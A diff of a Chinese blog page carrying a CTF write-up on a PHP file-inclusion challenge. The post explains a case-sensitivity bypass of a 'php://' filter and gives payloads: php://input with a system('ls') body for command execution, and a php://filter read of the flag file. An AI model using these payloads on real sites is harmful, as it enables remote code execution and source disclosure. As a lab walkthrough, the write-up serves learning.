@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>XYTK&#39;s Blog</title>
+    <title>【wp】攻防世界web进阶-web php include · XYTK&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >XYTK&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【wp】攻防世界web进阶-web php include</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>XYTK's Blog</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            XYTK's Blog
-            <!-- 文章页  -->
+            【wp】攻防世界web进阶-web php include
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,55 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                大哥，你是了解我的
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "文件包含">文件包含</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "攻防世界">攻防世界</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">619</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/13</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,275 +405,85 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/" >
-            
-                <span>【wp】bugku-login4&amp;CBC字节翻转攻击</span>
-        </a>
-        <div class="abstract-content">
-            前言题目中遇到了CBC字节翻转攻击，借此机会系统的学习一下。
-CBC字节翻转攻击的精髓在于损坏密文来改变明文。
-资料链接：https://blog.csdn.net/csu_vc/article/details/79619309
-https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>打开题目是一段PHP代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  show_source(__FILE__);</span><br><span class="line">  echo $_GET[&apos;hello&apos;];</span><br><span class="line">  $page=$_GET[&apos;page&apos;];</span><br><span class="line">  while (strstr($page, &quot;php://&quot;)) &#123;</span><br><span class="line">      $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);</span><br><span class="line">  &#125;</span><br><span class="line">  include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-CBC字节翻转攻击原理加密原理图：
+<p>猜测是绕过strstr( )函数，结合php伪协议进行命令执行和读取文件源代码</p>
+<hr>
+<h1 id="strstr-函数"><a href="#strstr-函数" class="headerlink" title="strstr()函数"></a>strstr()函数</h1><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>strstr()函数搜索字符串在另一个字符串中是否存在，如果存在，则返回包括匹配字符串的剩余字符串，否则返回false。</p>
+<p>该函数是二进制安全的。</p>
+<p>该函数是区分大小写的。(stristr()函数可以进行不区分大小写的搜索)</p>
+<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/strstr().jpg" title="XYTK">
 
-1、Plaintext：待加密的数据。
-2、IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。
-3、Cipherte...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CBC字节翻转攻击">CBC字节翻转攻击</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/16/推荐一些大佬的博客-持续更新/" >
-            
-                <span>推荐一些大佬的博客(持续更新)</span>
-        </a>
-        <div class="abstract-content">
-            渗透测试：谢公子: https://blog.csdn.net/qq_36119192?t=1
-干货集中营: http://www.nmd5.com/test/index.php
-Micro8: https://micro8.gitbook.io/micro8/
-https://paper.seebug.org/
+<hr>
+<h1 id="PHP命名大小写敏感规则"><a href="#PHP命名大小写敏感规则" class="headerlink" title="PHP命名大小写敏感规则"></a>PHP命名大小写敏感规则</h1><h2 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h2><h3 id="变量名"><a href="#变量名" class="headerlink" title="变量名"></a>变量名</h3><p>所有变量均区分大小写，包括普通变量以 及$_GET,$_POST,$_REQUEST,$_COOKIE,$_SESSION,$GLOBALS,$_SERVER,$_FILES,$_ENV 等；</p>
+<h3 id="常量名"><a href="#常量名" class="headerlink" title="常量名"></a>常量名</h3><p>使用define定义的常量是区分大小写的。</p>
+<h3 id="数组索引-键名"><a href="#数组索引-键名" class="headerlink" title="数组索引(键名)"></a>数组索引(键名)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array(&apos;one&apos;=&gt;&apos;first&apos;);</span><br><span class="line">echo $arr[&apos;one&apos;];    //输出&apos;first&apos;</span><br><span class="line">echo $arr[&apos;One&apos;];    //无输出并报错</span><br><span class="line">echo $Arr[&apos;one&apos;];    //上面讲过，变量名区分大小写，所以无输出并报错</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/16</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/13/【wp】攻防世界web进阶-web-php-include/" >
-            
-                <span>【wp】攻防世界web进阶-web php include</span>
-        </a>
-        <div class="abstract-content">
-            总述打开题目是一段PHP代码：
-123456789&lt;?php  show_source(__FILE__);  echo $_GET[&apos;hello&apos;];  $page=$_GET[&apos;page&apos;];  while (strstr($page, &quot;php://&quot;)) &#123;      $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);  &#125;  include($page);?&gt;
+<h2 id="不区分大小写"><a href="#不区分大小写" class="headerlink" title="不区分大小写"></a>不区分大小写</h2><h3 id="函数名、方法名、类名"><a href="#函数名、方法名、类名" class="headerlink" title="函数名、方法名、类名"></a>函数名、方法名、类名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    static public function Ceshi()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;123&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public funcion Dxx()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &apos;321&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new Test;</span><br><span class="line">$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj = new test;</span><br><span class="line">$obj-&gt;Dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line">$obj-&gt;dxx();    //成功实例化Test类，并调用Dxx方法输出&apos;321&apos;</span><br><span class="line"></span><br><span class="line">Test::Ceshi();    //输出&apos;123&apos;</span><br><span class="line">test::Ceshi();    //输出&apos;123&apos;</span><br><span class="line">Test::ceshi();    //输出&apos;123&apos;</span><br><span class="line">test::ceshi();    //输出&apos;123&apos;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-猜测是绕过strstr( )函数，结合php伪协议进行命令...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "文件包含">文件包含</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "攻防世界">攻防世界</a>
-    
-</div>
-            
-        </div>
+<h3 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h3><p>__LINE__、__FILE__、__DIR__、__FUNCTION__、__CLASS__、__METHOD__、 __NAMESPACE__等都不区分大小写。</p>
+<h3 id="NULL、TRUE、FALSE不区分大小写"><a href="#NULL、TRUE、FALSE不区分大小写" class="headerlink" title="NULL、TRUE、FALSE不区分大小写"></a>NULL、TRUE、FALSE不区分大小写</h3><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><p>(int)，(integer) – 转换成整型<br>(bool)，(boolean) – 转换成布尔型<br>(float)，(double)，(real) – 转换成浮点型<br>(string) – 转换成字符串<br>(array) – 转换成数组<br>(object) – 转换成对象  </p>
+<hr>
+<h1 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h1><p>在本题中，可以使用大小写的方式绕过对php://的检测</p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>将以post方式发送的数据执行</p>
+<blockquote>
+<p>payload:<br>?page=pHp://input<br>&lt;?php system(‘ls’)?&gt;</p>
+</blockquote>
+<p>得到：</p>
+<img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/ls_res.jpg" title="XYTK">
+
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><blockquote>
+<p>payload:<br>?page=pHp://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</p>
+</blockquote>
+<img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/flag_base64.jpg" title="XYTK">
+
+<p>进行base64解码即可得到flag</p>
+<img src="/2019/10/13/【wp】攻防世界web进阶-web-php-include/flag.jpg" title="XYTK">
+
+<hr>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>PHP命名大小写敏感规则：<a href="https://www.cnblogs.com/daipianpian/p/5721377.html" target="_blank" rel="noopener">https://www.cnblogs.com/daipianpian/p/5721377.html</a></p>
+
     </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/07/Python实现SPN加解密/" >
-            
-                <span>【转载】Python实现SPN加解密</span>
-        </a>
-        <div class="abstract-content">
-            前言原文地址：https://gooong.cn/post/cryptography-part1/
-SPN网络难道不是要介绍AES吗，怎么会变成SPN网络，这是啥？可以吃吗？  
-AES、DES等很多现代对称加密方法的核心就是SPN网络，它是代换-置换网络（Substitution-Permutation Network）的缩写,是现代对称加密方法设计的蓝本。可以说，了解SPN网络，就基本了解了AES。  
-很巧的是，这个网络正好是容易理解的。SPN网络的思想很简单：既然加密一次不够安全，那我就加密多次，把第一次加密产生的密文再进行加密，解密的时候我连续进行两次解密就可以了，这样是不是就...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "python">python</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Crypto">Crypto</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/06/第一篇blog/" >
-            
-                <span>第一篇blog</span>
-        </a>
-        <div class="abstract-content">
-            第一篇blog最近在学习新姿势的时候看了很多师傅的博客，觉得有一个地方能写点东西挺好的。趁着这次国庆假期，自己也搭了一个博客。  
-希望能够记录学习的东西，也希望能够给看得人一点点启发和思考。  
-博客内容简介：1、之前学习的零碎东西大多都在我的ipad里面，之后学习的一部分内容会发布到博客上面。  
-2、之前感觉每天都过得特别快，所以会以日记的形式零散的记录一些生活感悟、梦境和小故事等，之后也会发一些到博客上面。
-print(&quot;Hello My Blog!&quot;)PS:我的博客图片还没选好（作为一个重度选择困难者患者，我太难了）PS:由于本人水平有限，若博客中出现错误，...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Blog里的胡言乱语">Blog里的胡言乱语</a>
-    
-</div>
-            
-        </div>
-    </article>
+    <!-- license  -->
     
     <!-- paginator  -->
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/profile_photo.jpeg >
-    <div class="profile-name">XYTK</div>
-    
-    <div class="profile-signature">
-        平安喜乐  万事胜意
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/10/16/推荐一些大佬的博客-持续更新/" title= "推荐一些大佬的博客(持续更新)">
+                    <div class="nextTitle">推荐一些大佬的博客(持续更新)</div>
+                </a>
             
-                <a href="mailto:XYTK32624@163.com" class="iconfont-archer email" title=email ></a>
+        </li>
+        <li class="previous">
             
-        
-    
-        
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/07/Python实现SPN加解密/" title= "【转载】Python实现SPN加解密">
+                    <div class="prevTitle">【转载】Python实现SPN加解密</div>
+                </a>
             
-                <a href="//github.com/XYTK0x0" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
-            
-                <span class="iconfont-archer wechat" title=wechat>
-                  
-                  <img class="profile-qr" src="/assets/wechat_.png" />
-                </span>
-            
-        
     
-        
-            
-                <span class="iconfont-archer qq" title=qq>
-                  
-                  <img class="profile-qr" src="/assets/tim.jpg" />
-                </span>
-            
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-            
-                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
-            
-        
     
 
-    </div>
-    
-    
-    
-        <div class="about-me">
-            <a href = "/about" >ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -713,6 +577,24 @@ print(&quot;Hello My Blog!&quot;)PS:我的博客图片还没选好（作为一�
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#总述"><span class="toc-number">1.</span> <span class="toc-text">总述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#strstr-函数"><span class="toc-number">2.</span> <span class="toc-text">strstr()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#定义和用法"><span class="toc-number">2.1.</span> <span class="toc-text">定义和用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用法"><span class="toc-number">2.2.</span> <span class="toc-text">用法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP命名大小写敏感规则"><span class="toc-number">3.</span> <span class="toc-text">PHP命名大小写敏感规则</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#区分大小写"><span class="toc-number">3.1.</span> <span class="toc-text">区分大小写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#变量名"><span class="toc-number">3.1.1.</span> <span class="toc-text">变量名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常量名"><span class="toc-number">3.1.2.</span> <span class="toc-text">常量名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数组索引-键名"><span class="toc-number">3.1.3.</span> <span class="toc-text">数组索引(键名)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不区分大小写"><span class="toc-number">3.2.</span> <span class="toc-text">不区分大小写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#函数名、方法名、类名"><span class="toc-number">3.2.1.</span> <span class="toc-text">函数名、方法名、类名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#魔术常量"><span class="toc-number">3.2.2.</span> <span class="toc-text">魔术常量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NULL、TRUE、FALSE不区分大小写"><span class="toc-number">3.2.3.</span> <span class="toc-text">NULL、TRUE、FALSE不区分大小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强制类型转换"><span class="toc-number">3.2.4.</span> <span class="toc-text">强制类型转换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php"><span class="toc-number">4.</span> <span class="toc-text">php://</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-input"><span class="toc-number">4.1.</span> <span class="toc-text">php://input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-filter"><span class="toc-number">4.2.</span> <span class="toc-text">php://filter</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -906,6 +788,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
